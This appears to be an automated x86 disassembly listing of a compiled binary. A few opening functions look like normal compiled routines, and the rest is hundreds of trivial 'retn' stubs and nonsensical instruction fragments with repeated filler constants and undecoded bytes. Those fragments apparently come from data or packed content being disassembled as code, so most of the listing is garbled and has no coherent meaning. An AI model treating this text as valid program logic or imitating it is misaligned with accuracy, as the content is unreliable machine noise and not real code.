sub_47ad54
push ebx
push esi
mov esi eax
mov [ esi + 0x8c ] ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop esi
pop ebx
retn
sub_47ad68
push esi
mov esi eax
mov eax [ esi + 0x88 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47ad78
mov eax [ eax + 0x88 ]
mov [ eax + 0x1c ] edx
retn
sub_47afda
jmp sub_403830
sub_47b006
jmp sub_403ae4
sub_47b00d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b02a
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_47b023
jmp sub_403ae4
sub_47b02a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b034
mov ecx [ eax + 0x68 ]
mov edx [ eax + 0x70 ]
mov eax [ eax + 0x78 ]
call sub_47ad54
retn
sub_47b069
jmp sub_403ae4
sub_47b070
pop ebp
retn
sub_47b074
sub [ rw-data ] 0x1
retn
sub_47b23c
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_47b305
jmp sub_403ae4
sub_47b30c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b339
jmp sub_403ae4
sub_47b340
pop ebp
retn
sub_47b344
sub [ rw-data ] 0x1
retn
sub_47b43e
inc esp
add al dh
int3
sub_47b442
inc esp
add [ ecx + edi ] al
inc esi
add [ eax - 0x35 ] dl
inc esp
add al cl
test [ eax + eax - 0x8 ] 0x9c00463f
or [ ebp ] eax
inc esp
hlt
sub_47b799
retn
sub_47b79a
cmp [ ebx ] ebp
xor eax 0x35b516da
ficomp [ esi ]
mov bl 0xa
ficom [ esi ]
mov ebx 0x5b16d803
mov edx 0x53534f75
retn
sub_47b7b2
retn
sub_47b7b3
fadd [ ebx - 0x76f925cb ]
or [ ecx ] edi
and esi [ 0x98f06da ]
mov edx 0x535357fa
retn
sub_47b7c7
retn
sub_47b7c8
retn
sub_47b7c9
retn
sub_47b7ca
retn
sub_47b7cb
retn
sub_47b7cc
retn
sub_47b7cd
retn
sub_47b7ce
retn
sub_47b7ea
retn
sub_47b7eb
retn
sub_47b7ec
retn
sub_47b827
cmp [ edi ] edi
xor eax 0xd89b06da
xor [ 0x99906da ] 0x39
and al 0xba
out 0x45 al
push ebx
push ebx
retn
sub_47b83c
add [ edx + 0x535313b8 ] bh
retn
sub_47b843
retn
sub_47b844
retn
sub_47b845
retn
sub_47b846
retn
sub_47b847
retn
sub_47b848
retn
sub_47b849
retn
sub_47b84a
retn
sub_47b84b
mov edx 0x53534853
retn
sub_47b851
retn
sub_47b852
retn
sub_47b853
retn
sub_47b854
retn
sub_47b855
retn
sub_47b856
retn
sub_47b857
retn
sub_47b858
retn
sub_47b859
retn
sub_47b85a
retn
sub_47b85b
retn
sub_47b85c
retn
sub_47b85d
retn
sub_47b85e
retn
sub_47b85f
retn
sub_47b860
retn
sub_47b861
retn
sub_47b862
retn
sub_47b863
retn
sub_47b864
retn
sub_47b865
retn
sub_47b866
retn
sub_47b867
retn
sub_47b868
retn
sub_47b869
retn
sub_47b86a
retn
sub_47b86b
retn
sub_47b86c
retn
sub_47b86d
retn
sub_47b86e
retn
sub_47b86f
retn
sub_47b870
retn
sub_47b871
retn
sub_47b872
retn
sub_47b873
retn
sub_47b874
retn
sub_47b875
retn
sub_47b876
retn
sub_47b877
retn
sub_47b878
retn
sub_47b879
retn
sub_47b87a
retn
sub_47b87b
retn
sub_47b87c
retn
sub_47b87d
retn
sub_47b87e
retn
sub_47b87f
retn
sub_47b880
retn
sub_47b881
retn
sub_47b882
retn
sub_47b883
retn
sub_47b884
retn
sub_47b885
retn
sub_47b886
retn
sub_47b887
retn
sub_47b888
retn
sub_47b889
retn
sub_47b88a
retn
sub_47b88b
retn
sub_47b88c
retn
sub_47b88d
retn
sub_47b88e
retn
sub_47b88f
retn
sub_47b890
retn
sub_47b891
retn
sub_47b892
retn
sub_47b893
retn
sub_47b894
cmp [ ecx + 0x35 ] esi
ficom [ esi ]
mov bh 0xb
cmp [ ebx - 0x46 ] esi
rcl [ ecx ] 0x1
push ebx
push ebx
retn
sub_47b8a6
mov ebx 0x5353628d
mov edx 0xacacac6e
retn
sub_47b8b1
xor eax 0x396506da
xor al 0x35
fisubr [ esi ]
mov edi 0x6da3509
imul ebx eax 0xffffffad
xor eax 0xd8bd2eda
test [ 0xffffffffd86906da ] esi
stosd [ edi ]
xor eax 0xd8a32eda
xor [ 0xffffffffd86f06da ] 0xffffffaa
mov edx 0x535348da
retn
sub_47b8e0
pushad
xchg ebx eax
or eax 0xc3c39008
retn
sub_47b8e8
retn
sub_47b8e9
retn
sub_47b8ea
retn
sub_47b8eb
retn
sub_47b8ec
retn
sub_47b8ed
retn
sub_47b8ee
retn
sub_47b8ef
retn
sub_47b8f0
retn
sub_47b8f1
retn
sub_47b8f2
xor eax 0xbaa51eda
aad 0x46
push ebx
push ebx
retn
sub_47b8fc
retn
sub_47b8fd
retn
sub_47b8fe
retn
sub_47b8ff
retn
sub_47b902
call [ ebx + 0x53 ]
push ebx
cmp ebx [ edi - 0x45acacad ]
pop esi
dec ebx
push ebx
push ebx
retn
sub_47b911
retn
sub_47b912
retn
sub_47b913
retn
sub_47b914
retn
sub_47b915
retn
sub_47b916
retn
sub_47b917
retn
sub_47b918
retn
sub_47b919
retn
sub_47b91a
retn
sub_47b925
call [ ebx + 0x53 ]
push ebx
mov edx 0x53535419
retn
sub_47b92f
retn
sub_47b930
retn
sub_47b931
retn
sub_47b932
push es
fdivr [ edi + 0x536d7fba ]
push ebx
retn
sub_47b93b
retn
sub_47b93c
retn
sub_47b93d
retn
sub_47b93e
retn
sub_47b93f
retn
sub_47b940
retn
sub_47b941
retn
sub_47b942
retn
sub_47b943
retn
sub_47b944
fcom [ esi ]
stosd [ edi ]
or al 0x8
0xc3c3c390 0xc3c3
retn
sub_47b951
retn
sub_47b954
rcl [ ebx + 0x53 ] cl
push ebx
lodsb [ esi ]
and eax 0xa716da03
mov edx 0x535352a2
mov ebx 0x53534243
rcl [ edi + 0x4752ba5f ] 0x1
push ebx
push ebx
retn
sub_47b971
retn
sub_47b972
retn
sub_47b973
retn
sub_47b974
retn
sub_47b975
retn
sub_47b976
retn
sub_47b977
retn
sub_47b978
retn
sub_47b979
retn
sub_47b97a
retn
sub_47b97b
retn
sub_47b996
retn
sub_47b997
retn
sub_47b998
retn
sub_47b999
retn
sub_47b99a
or edi [ edx + 0x535378db ]
retn
sub_47b9a1
retn
sub_47b9bd
retn
sub_47b9be
retn
sub_47b9bf
retn
sub_47b9c0
retn
sub_47b9c1
retn
sub_47b9c2
retn
sub_47b9c3
aaa
xchg ebx eax
push ebx
push ebx
push ebx
mov edx 0x53534094
retn
sub_47b9cf
retn
sub_47b9d0
retn
sub_47b9d1
retn
sub_47b9d2
retn
sub_47b9d3
retn
sub_47b9d4
retn
sub_47b9d5
retn
sub_47b9d6
retn
sub_47b9d7
retn
sub_47b9d8
retn
sub_47b9d9
retn
sub_47b9da
retn
sub_47b9db
retn
sub_47ba10
call [ ebx + 0x53 ]
push ebx
cmp edx [ eax - 0x45acacad ]
out 0x1 eax
push ebx
push ebx
retn
sub_47ba1f
retn
sub_47ba20
retn
sub_47ba21
retn
sub_47ba22
retn
sub_47ba23
retn
sub_47ba24
retn
sub_47ba25
retn
sub_47ba26
retn
sub_47ba27
retn
sub_47ba28
xor eax 0xbaa306da
inc edx
jg r-xdata
push ebx
push ebx
retn
push ebx
retn
sub_47ba32
pushad
cmp [ ecx ] 0x6da353d
mov bh 0xd8
xor [ 0xffffffffbaeb06da ] 0xe8
pop es
push ebx
push ebx
retn
sub_47ba46
retn
sub_47ba69
retn
sub_47ba6a
retn
sub_47ba6b
fcom [ esi ]
scasd [ edi ]
mov edx 0x53535314
retn
sub_47ba74
retn
sub_47ba75
retn
sub_47ba76
ficom [ esi ]
mov bh 0x0
add edi [ ebx + 0x53534244 ]
mov edx 0x535379ed
retn
sub_47ba86
retn
sub_47ba87
lodsb [ esi ]
inc ebx
mov edx 0x53534bb7
retn
sub_47ba90
retn
sub_47ba91
retn
sub_47baba
pop esp
in al 0x57
adc al bl
push edi
aam 0x50
push ss
pop ebx
mov edx 0x53535f38
retn
sub_47baca
retn
sub_47bacb
retn
sub_47bacc
retn
sub_47bacd
retn
sub_47bace
retn
sub_47bacf
retn
sub_47bad0
retn
sub_47bad1
retn
sub_47bad2
retn
sub_47bad3
retn
sub_47bad4
retn
sub_47bad5
retn
sub_47bad6
pop esp
xlat
lahf
push eax
push ebx
push ebx
mov edx 0x53535587
retn
sub_47bae3
retn
sub_47bae4
retn
sub_47bae5
retn
sub_47bae6
retn
sub_47bae7
retn
sub_47bae8
retn
sub_47bae9
retn
sub_47baea
retn
sub_47baeb
retn
sub_47baec
retn
sub_47baed
retn
sub_47baee
retn
sub_47baef
retn
sub_47baf0
retn
sub_47baf1
retn
sub_47baf2
retn
sub_47baf3
retn
sub_47baf4
retn
sub_47baf5
retn
sub_47baf6
retn
sub_47baf7
retn
sub_47baf8
retn
sub_47baf9
retn
sub_47bafa
push es
mov edx 0x5353514f
retn
sub_47bb01
fcom [ ebx - 0x28 ]
adc ecx [ ebx - 0x26 ]
push edi
ja r-xdata
retn
push edi
ja r-xdata
push ebx
retn
nop
fadd [ ebp + esi + 0x1cbaa5d6 ]
add edx [ ebx + 0x53 ]
sub_47bb19
retn
sub_47bb1a
retn
sub_47bb1b
retn
sub_47bb1c
retn
sub_47bb1d
retn
sub_47bb1e
or bh [ edx + 0x5353459b ]
or al 0xd
0xbfd80690 0x202
add al 0x60
lodsb [ esi ]
add al 0x39
push edi
mov edx 0x5353629c
retn
sub_47bb39
retn
sub_47bb3a
cmp [ eax + 0x4 ] edx
cmp [ edx - 0x46 ] edx
cdq
inc eax
push ebx
push ebx
retn
sub_47bb45
retn
sub_47bb46
retn
sub_47bb47
retn
sub_47bb48
cmp [ ebx ] edx
ficom [ esi ]
cmpsd [ esi ] [ edi ]
mov edx 0x53537ba8
retn
sub_47bb53
retn
sub_47bb85
push ebx
push ebx
push ebx
mov ebx 0x53535814
cmp esi [ edx + edx + 0x3b ]
or [ edx + edi * 4 ] al
and esi [ ebx + 0x53 ]
push ebx
mov edx 0x53535e95
retn
sub_47bb9e
retn
sub_47bb9f
retn
sub_47bba0
retn
sub_47bba1
retn
sub_47bba2
add [ 0x536380ba ] al
push ebx
retn
sub_47bbaa
retn
sub_47bbab
retn
sub_47bbac
or edi [ ecx ]
cmp dh [ 0xffffffffbabd16da ]
pushfd
jns r-xdata
retn
push ebx
xor eax 0xba8b16da
xor ebx [ edi ]
push ebx
push ebx
retn
sub_47bbc2
retn
sub_47bbc3
retn
sub_47bbc4
retn
sub_47bbc5
retn
sub_47bbc6
salc
xchg ebx eax
mov edx 0x53534bb3
retn
sub_47bbce
retn
sub_47bbcf
retn
sub_47bbd0
0xc3c3c390 0xc3c3
retn
sub_47bbd8
mov ebx 0xacacae06
or cl [ edx ]
0xc3c3c390 0xc3c3
retn
sub_47bbe7
retn
sub_47bbe8
retn
sub_47bbe9
retn
sub_47bbea
retn
sub_47bbeb
retn
sub_47bbec
retn
sub_47bbed
retn
sub_47bbee
retn
sub_47bbef
xor eax 0x8af0eda
mov edx 0x5353449f
retn
sub_47bbfa
add ebx eax
xchg ebp eax
mov ebx 0x535379b6
or dl dh
xchg ebx eax
mov edx 0x53530076
retn
sub_47bc0b
retn
sub_47bc0c
retn
sub_47bc0d
retn
sub_47bc0e
retn
sub_47bc0f
retn
sub_47bc48
retn
sub_47bc49
retn
sub_47bc4a
retn
sub_47bc4b
retn
sub_47bc4c
push eax
inc edi
adc ch [ eax + 0x1e ]
pop edi
mov edx 0x53531342
retn
sub_47bc59
retn
sub_47bc5a
retn
sub_47bc5b
retn
sub_47bc5c
salc
0x5351c9ba 0xc353
retn
sub_47bc65
retn
sub_47bc66
xor eax 0xba8f1eda
0x5302
sub_47bc6e
push ebx
cmp [ edi ] edi
xor eax 0x98d06da
cmp [ esi ] esi
xor eax 0x9b306da
mov edx 0x53536baa
retn
sub_47bc84
retn
sub_47bc85
retn
sub_47bc86
retn
sub_47bc87
retn
sub_47bcbb
retn
sub_47bcbc
retn
sub_47bcbd
retn
sub_47bcbe
retn
sub_47bcbf
retn
sub_47bcc0
retn
sub_47bcc1
retn
sub_47bcc2
retn
sub_47bcc3
retn
sub_47bcc4
retn
sub_47bcc5
retn
sub_47bcc6
retn
sub_47bcc7
retn
sub_47bcc8
retn
sub_47bcc9
retn
sub_47bcca
retn
sub_47bccb
mov ebx 0x53537f0e
fsub [ ebx + 0x53495fba ]
push ebx
retn
sub_47bcd8
lodsb [ esi ]
daa
ja r-xdata
mov edx 0x53535737
retn
push eax
xchg esp eax
add edi [ edx - 0x5353516a ]
mov edx 0x5353486a
retn
sub_47bcea
retn
sub_47bceb
retn
sub_47bced
retn
sub_47bd0a
call [ ebx + 0x53 ]
push ebx
mov edx 0x53536316
retn
sub_47bd14
retn
sub_47bd15
retn
sub_47bd16
retn
sub_47bd17
retn
sub_47bd18
retn
sub_47bd19
retn
sub_47bd1a
retn
sub_47bd1b
retn
sub_47bd1c
fdivr [ edi + 0x5737ba02 ]
push ebx
push ebx
retn
sub_47bd25
retn
sub_47bd26
add al 0xba
int1
pushad
push ebx
push ebx
retn
sub_47bd2d
retn
sub_47bd2e
retn
sub_47bd2f
retn
sub_47bd30
retn
sub_47bd31
retn
sub_47bd32
cmp [ esp + ebp * 4 - 0xf4540da ] ebp
push 0xc3c35353
push es
fdivr [ edi - 0x45bc4030 ]
0x3553537b 0xaad0
sub_47bd4c
bt [ ecx - 0x3cacac87 ] 0xba
push edi
lodsb [ esi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47bd59
retn
sub_47bd5a
retn
sub_47bd5b
retn
sub_47bd5c
retn
sub_47bd5d
retn
sub_47bd5e
retn
sub_47bd5f
retn
sub_47bd60
retn
sub_47bd61
retn
sub_47bd62
retn
sub_47bd63
retn
sub_47bd64
push es
fdivr [ edi - 0x45f04030 ]
popfd
insd
push ebx
push ebx
retn
sub_47bd70
xor eax 0xba42676a
mov [ ecx + 0x53 ] dh
push ebx
retn
sub_47bd7a
retn
sub_47bd7b
retn
sub_47bd7c
retn
sub_47bdbb
retn
sub_47bdbc
retn
sub_47bdef
sar [ edi + 0x7a60ba47 ] 0x1
push ebx
push ebx
retn
sub_47bdf8
retn
sub_47bdf9
retn
sub_47be04
retn
sub_47be05
retn
sub_47be06
retn
sub_47be07
retn
sub_47be08
retn
sub_47be09
retn
sub_47be0a
retn
sub_47be34
retn
sub_47be35
retn
sub_47be36
cmp [ esi ] edi
mov edx 0x5353756c
retn
sub_47be3e
retn
sub_47be3f
retn
sub_47be5b
retn
sub_47be5c
retn
sub_47be5d
retn
sub_47be5e
retn
sub_47be5f
retn
sub_47be60
retn
sub_47be61
retn
sub_47be62
retn
sub_47be63
retn
sub_47be64
retn
sub_47be65
retn
sub_47be66
add edi [ ebx ]
push edi
push edx
push ebx
push ebx
mov edx 0x53536a83
retn
sub_47be74
xchg ebx eax
or al 0x8
0xc3c3c390 0xbc3
mov edx 0xacaca942
retn
sub_47be86
retn
sub_47be87
retn
sub_47be88
retn
sub_47be89
retn
sub_47be8a
retn
sub_47be8b
retn
sub_47beb4
retn
sub_47beb5
retn
sub_47beb6
retn
sub_47beb7
retn
sub_47beb8
retn
sub_47beb9
retn
sub_47beba
retn
sub_47bebb
retn
sub_47bebc
retn
sub_47bebd
retn
sub_47bebe
retn
sub_47bed7
retn
sub_47bed8
retn
sub_47bed9
retn
sub_47beda
retn
sub_47bedb
retn
sub_47bedc
mov edx 0x53535a02
retn
sub_47bee2
retn
sub_47bee3
retn
sub_47bee4
retn
sub_47bee5
retn
sub_47bee6
or eax 0xc3c39008
retn
sub_47beec
retn
sub_47beed
retn
sub_47beee
retn
sub_47beef
retn
sub_47bef0
retn
sub_47bef1
retn
sub_47bef2
retn
sub_47bf24
lodsb [ esi ]
add eax 0x779aba63
push ebx
push ebx
retn
sub_47bf2d
retn
sub_47bf2e
retn
sub_47bf48
retn
sub_47bf49
retn
sub_47bf4a
retn
sub_47bf4b
retn
sub_47bf4c
retn
sub_47bf4d
retn
sub_47bf4e
retn
sub_47bf4f
retn
sub_47bf50
retn
sub_47bf51
retn
sub_47bf52
retn
sub_47bf53
retn
sub_47bf54
retn
sub_47bf55
retn
sub_47bf56
retn
sub_47bf57
retn
sub_47bf58
fimul [ ecx ]
cmp [ edx + 0x535345e9 ] 0xffffffc3
retn
sub_47bf62
retn
sub_47bf63
retn
sub_47bf64
retn
sub_47bf65
retn
sub_47bf66
retn
sub_47bf67
retn
sub_47bf68
retn
sub_47bf69
xor eax 0xbbb16da
cmp [ ebx - 0x46 ] esi
adc [ edx + 0x53 ] esi
push ebx
retn
sub_47bf76
retn
sub_47bf77
retn
sub_47bf78
fcom [ edx + edi * 4 + 0x53536678 ]
retn
sub_47bf80
retn
sub_47bf81
retn
sub_47bf82
retn
sub_47bf83
cmp [ ebx - 0x54 ] edx
add eax 0x5c93d61f
xlat
push ss
push ebx
push ebx
mov edx 0x53531ae8
retn
sub_47bf96
retn
sub_47bf98
retn
sub_47bf99
retn
sub_47bf9b
retn
sub_47bf9c
push es
fdivr [ edi + 0x60040002 ]
lodsb [ esi ]
mov edx 0xacaca960
retn
sub_47bfaa
retn
sub_47bfab
retn
sub_47bfac
retn
sub_47bfad
retn
sub_47bfae
retn
sub_47bfaf
retn
sub_47bfb0
xor eax 0x39a71eda
or edi [ ss : edx + 0x53534a22 ]
retn
sub_47bfdd
retn
sub_47bfde
retn
sub_47bfdf
retn
sub_47bfe0
retn
sub_47bfe1
retn
sub_47bfe2
retn
sub_47bfe3
retn
sub_47bfe4
retn
sub_47bfe5
retn
sub_47bfe6
retn
sub_47bfe7
retn
sub_47bfe8
pop esp
in al 0x42
add [ edx + 0x535348a8 ] bh
retn
sub_47bff2
retn
sub_47bff3
retn
sub_47bff4
mov edx 0x53536d70
retn
sub_47bffa
retn
sub_47bffb
retn
sub_47bffc
retn
sub_47bffd
retn
sub_47bffe
retn
sub_47bfff
retn
sub_47c000
retn
sub_47c001
retn
sub_47c002
retn
sub_47c014
retn
sub_47c015
retn
sub_47c016
xor eax 0xd84f16da
xchg ecx eax
xor eax 0xb4d16da
cmp [ ebp + 0xd ] edi
cmp [ esi ] esi
mov edx 0x53536528
retn
sub_47c02c
retn
sub_47c02d
retn
sub_47c02e
retn
sub_47c02f
retn
sub_47c030
retn
sub_47c031
retn
sub_47c032
retn
sub_47c033
retn
sub_47c034
retn
sub_47c0c4
retn
sub_47c0c5
retn
sub_47c0c6
retn
sub_47c0c7
retn
sub_47c0c8
retn
sub_47c0c9
retn
sub_47c0ca
retn
sub_47c0cb
retn
sub_47c0cc
retn
sub_47c0cd
retn
sub_47c0ce
retn
sub_47c0ef
retn
sub_47c0f0
retn
sub_47c0f1
retn
sub_47c0f2
retn
sub_47c0f3
retn
sub_47c0f4
retn
sub_47c0f5
retn
sub_47c0f6
retn
sub_47c0f7
retn
sub_47c0f8
retn
sub_47c0f9
lodsb [ esi ]
les esp [ edi - 0x6facacad ]
retn
sub_47c101
retn
sub_47c102
retn
sub_47c103
retn
sub_47c104
retn
sub_47c105
retn
sub_47c106
retn
sub_47c107
retn
sub_47c108
retn
sub_47c153
retn
sub_47c154
retn
sub_47c157
retn
sub_47c158
retn
sub_47c159
retn
sub_47c15a
retn
sub_47c15b
retn
sub_47c15c
retn
sub_47c15d
retn
sub_47c15e
retn
sub_47c15f
cmp [ edi ] esi
or [ 0x396706da ] esi
xor [ ecx ] ecx
mov edx 0xacaca410
retn
sub_47c16f
retn
sub_47c170
retn
sub_47c171
retn
sub_47c172
retn
sub_47c174
retn
sub_47c175
retn
sub_47c176
retn
sub_47c177
retn
sub_47c178
fcomp st6
daa
test al 0xac
lodsb [ esi ]
add eax [ 0xffffffffba0304ac ]
iretd
sub_47c186
lodsb [ esi ]
lodsb [ esi ]
shl [ esi ] 0x1
scasd [ edi ]
push ebx
mov edx 0xacacab61
retn
sub_47c192
retn
sub_47c193
retn
sub_47c194
retn
sub_47c195
retn
sub_47c196
retn
sub_47c1b0
retn
sub_47c1b1
retn
sub_47c1b2
retn
sub_47c1b3
retn
sub_47c1b4
retn
sub_47c1cd
retn
sub_47c1ce
retn
sub_47c1cf
retn
sub_47c1d0
xor eax 0xba516da
xor eax 0x60ab16da
xchg ebx eax
mov edx 0x53531365
retn
sub_47c1e1
retn
sub_47c1e2
retn
sub_47c1e3
cmp edx [ ebx + 0x63 ]
push ebx
push ebx
push eax
xchg ebx eax
mov edx 0x53531959
retn
sub_47c1f0
retn
sub_47c1f1
retn
sub_47c1f2
retn
sub_47c1f3
retn
sub_47c1f4
retn
sub_47c1f5
retn
sub_47c1f6
retn
sub_47c1f7
retn
sub_47c1f8
retn
sub_47c1f9
retn
sub_47c1fa
retn
sub_47c1fb
retn
sub_47c1fc
add edi [ edx + 0x53534f7c ]
ficom [ eax ]
inc ebx
add al dl
xchg edx eax
mov [ 0x5353b9bb ] eax
push ebx
fcom [ eax ]
mov edx 0xacaca4c7
retn
sub_47c217
retn
sub_47c218
retn
sub_47c219
retn
sub_47c21a
retn
sub_47c21b
retn
sub_47c21c
retn
sub_47c21d
retn
sub_47c21e
retn
sub_47c21f
retn
sub_47c220
retn
sub_47c221
lodsb [ esi ]
inc esi
call [ ebx + 0x53 ]
push ebx
mov edx 0xacaca9b1
retn
sub_47c22d
retn
sub_47c22e
retn
sub_47c22f
retn
sub_47c230
xor eax 0xba8516da
and al 0xae
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47c23a
retn
sub_47c23b
retn
sub_47c23c
retn
sub_47c23d
retn
sub_47c23e
retn
sub_47c23f
retn
sub_47c240
retn
sub_47c241
retn
sub_47c242
retn
sub_47c243
retn
sub_47c244
retn
sub_47c245
retn
sub_47c246
retn
sub_47c247
retn
sub_47c248
retn
sub_47c249
retn
sub_47c24a
retn
sub_47c24b
retn
sub_47c29c
retn
sub_47c29d
xor eax 0xba116da
mov edx 0x535352e5
retn
sub_47c2a8
retn
sub_47c2a9
retn
sub_47c2aa
retn
sub_47c2d8
retn
sub_47c2d9
retn
sub_47c2da
retn
sub_47c2db
retn
sub_47c2dc
retn
sub_47c2dd
retn
sub_47c2de
retn
sub_47c2df
retn
sub_47c2e0
retn
sub_47c2e1
fiadd [ esi ]
mov ebx 0x537dd4bb
push ebx
mov edx 0x53536ec0
retn
sub_47c303
retn
sub_47c304
retn
sub_47c305
retn
sub_47c306
dec eax
xchg ebx eax
adc ebx [ edx - 0x3c3c3c70 ]
retn
sub_47c30f
retn
sub_47c310
retn
sub_47c311
retn
sub_47c312
retn
sub_47c313
retn
sub_47c314
retn
sub_47c315
retn
sub_47c316
retn
sub_47c317
retn
sub_47c318
retn
sub_47c319
retn
sub_47c31a
retn
sub_47c31b
retn
sub_47c31c
retn
sub_47c31d
retn
sub_47c336
mov edx 0x53535445
retn
sub_47c347
retn
sub_47c348
retn
sub_47c349
salc
xchg ebx eax
mov edx 0x53537059
retn
sub_47c351
retn
sub_47c352
retn
sub_47c384
retn
sub_47c386
mov ebx 0x5353682c
mov edx 0x5353163a
retn
sub_47c391
retn
sub_47c392
retn
sub_47c393
retn
sub_47c394
retn
sub_47c395
retn
sub_47c396
xor eax 0xd88d0eda
mov [ edx + 0x53536777 ] edi
retn
sub_47c3a2
retn
sub_47c3a3
retn
sub_47c3a4
retn
sub_47c3a5
retn
sub_47c3a6
retn
sub_47c3a7
xor eax 0xaa31eda
cmp [ edi ] esp
xor eax 0xaa11eda
cmp [ ebp + 0x35 ] edi
ficomp [ esi ]
cmpsd [ esi ] [ edi ]
or bh [ ecx ]
sub esi [ 0xffffffffbaa51eda ]
fild [ edi + 0x53 ]
push ebx
retn
sub_47c3c6
retn
sub_47c3c7
retn
sub_47c3f3
retn
sub_47c3f4
retn
sub_47c3f5
retn
sub_47c3f6
retn
sub_47c3f7
retn
sub_47c3f8
retn
sub_47c3f9
retn
sub_47c3fa
retn
sub_47c3fb
retn
sub_47c3fc
retn
sub_47c3fd
retn
sub_47c3fe
pop esp
in al 0x47
and bh [ edx + 0x53534e03 ]
retn
sub_47c408
salc
xchg ebx eax
pop esp
xlat
push cs
dec edx
push ebx
push ebx
pushad
xchg ebx eax
adc edi [ edx + 0x53537f42 ]
retn
sub_47c419
retn
sub_47c41a
retn
sub_47c41b
retn
sub_47c41c
retn
sub_47c41d
retn
sub_47c41e
retn
sub_47c41f
retn
sub_47c420
retn
sub_47c421
retn
sub_47c422
retn
sub_47c423
push es
fdivr [ edi + 0x3963bfd0 ]
xor [ ebx ] ecx
cmp [ edi ] esi
xor eax 0xbbb16da
cmp [ edx ] esi
mov edx 0x535370af
retn
sub_47c463
retn
sub_47c464
retn
sub_47c465
retn
sub_47c466
retn
sub_47c467
shr [ edx - 0x102ea38d ] 0x1
dec ebx
push ebx
push ebx
mov edx 0x53537efe
retn
sub_47c476
retn
sub_47c479
retn
sub_47c47a
push ebx
push ebx
push ebx
mov edx 0xacaca147
retn
sub_47c483
retn
sub_47c4b1
retn
sub_47c4b2
retn
sub_47c4b3
retn
sub_47c4b4
retn
sub_47c4b5
retn
sub_47c4f2
retn
sub_47c4f3
or eax 0xeb6d808
nop
retn
sub_47c4fa
retn
sub_47c4fb
retn
sub_47c4fc
retn
sub_47c4fd
retn
sub_47c4fe
retn
sub_47c4ff
retn
sub_47c500
retn
sub_47c501
retn
sub_47c502
retn
sub_47c503
retn
sub_47c504
retn
sub_47c505
retn
sub_47c506
retn
sub_47c507
retn
sub_47c508
retn
sub_47c509
retn
sub_47c536
xchg edx eax
mov edx 0x5353795d
retn
sub_47c53d
retn
sub_47c53e
retn
sub_47c53f
retn
sub_47c540
retn
sub_47c564
retn
sub_47c565
retn
sub_47c566
retn
sub_47c567
retn
sub_47c568
retn
sub_47c569
retn
sub_47c56a
retn
sub_47c56b
retn
sub_47c56c
ficomp [ esi ]
scasd [ edi ]
mov edx 0x53537d0d
retn
sub_47c575
retn
sub_47c576
retn
sub_47c578
retn
sub_47c579
retn
sub_47c57a
retn
sub_47c57b
retn
sub_47c57c
retn
sub_47c57d
retn
sub_47c57e
retn
sub_47c57f
lodsb [ esi ]
add al 0x1f
mov edx 0x53531122
retn
sub_47c588
retn
sub_47c589
retn
sub_47c58a
retn
sub_47c58b
retn
sub_47c58c
retn
sub_47c58d
retn
sub_47c58e
retn
sub_47c58f
retn
sub_47c590
retn
sub_47c591
retn
sub_47c5fa
out 0x53 eax
push ebx
push ebx
mov edx 0xacaca0cc
retn
sub_47c604
retn
sub_47c605
retn
sub_47c606
retn
sub_47c607
retn
sub_47c608
retn
sub_47c609
rcl [ edi - 0x482a25bd ] 0x1
push ebx
push ebx
push ebx
ficom [ esi ]
cmpsd [ esi ] [ edi ]
add edx [ esi + edx + 0x362026a7 ]
and [ edx + 0x5353792f ] edi
retn
sub_47c62a
xor eax 0x81b0eda
mov edx 0x535374eb
retn
sub_47c635
retn
sub_47c636
push es
fdivr [ edi + 0x6fbfd0 ]
pushad
xchg ebx eax
add eax 0xab16da04
ficom [ esi ]
cmpsd [ esi ] [ edi ]
mov edx 0x53535f6c
retn
sub_47c64d
cmp ecx [ edi - 0x7f ]
out dx eax
fiadd [ edx + ebx * 8 ]
adc eax 0xa98cba33
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47c65c
retn
sub_47c65d
retn
sub_47c65e
retn
sub_47c65f
retn
sub_47c660
retn
sub_47c661
retn
sub_47c662
retn
sub_47c663
retn
sub_47c664
retn
sub_47c665
fmul [ ebx + 0x53516aba ]
push ebx
retn
sub_47c66d
retn
sub_47c680
sbb [ ebx + 0x53 ] dl
retn
sub_47c69a
retn
sub_47c69b
0xd5d75c90 0x5317
push ebx
mov edx 0x535340a2
retn
sub_47c6a9
retn
sub_47c6aa
add al 0xba
xchg esp eax
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47c6b1
retn
sub_47c6b2
retn
sub_47c6b3
retn
sub_47c6b4
retn
sub_47c6b5
retn
sub_47c6b6
retn
sub_47c6b7
retn
sub_47c6b8
retn
sub_47c6b9
retn
sub_47c6ba
retn
sub_47c6bb
retn
sub_47c6bc
retn
sub_47c6bd
retn
sub_47c6be
retn
sub_47c6bf
retn
sub_47c6c0
retn
sub_47c6c3

sub_47c6c4
push ebx
push ebx
push ebx
push 0xe
pop edi
mov edx 0x53531233
retn
sub_47c6d0
retn
sub_47c6d1
retn
sub_47c6d2
retn
sub_47c6d3
retn
sub_47c7ab
push ebx
push ebx
mov ebx 0xacacac71
mov edx 0xacaca8f1
retn
sub_47c7b8
retn
sub_47c7b9
retn
sub_47c7ba
retn
sub_47c7bb
retn
sub_47c7bc
retn
sub_47c7bd
retn
sub_47c7be
retn
sub_47c7bf
retn
sub_47c7c0
retn
sub_47c7c1
retn
sub_47c7c2
retn
sub_47c7c3
retn
sub_47c7c4
add ebx eax
movsb [ edi ] [ esi ]
mov ebx 0x53536975
mov edx 0x535379da
retn
sub_47c7d2
retn
sub_47c7d3
retn
sub_47c7d4
cmp [ ebx + 0x35 ] esi
fiadd [ esi ]
lea ecx [ ecx ]
cmp [ eax ] esp
xor eax 0xd8b306da
xor [ 0xffffffffbab106da ] 0xce
push ebx
push ebx
retn
sub_47c7ed
retn
sub_47c7ee
retn
sub_47c7ef
retn
sub_47c7f0
retn
sub_47c818
add al 0x4
add al 0x0
fisubr [ esi ]
scasd [ edi ]
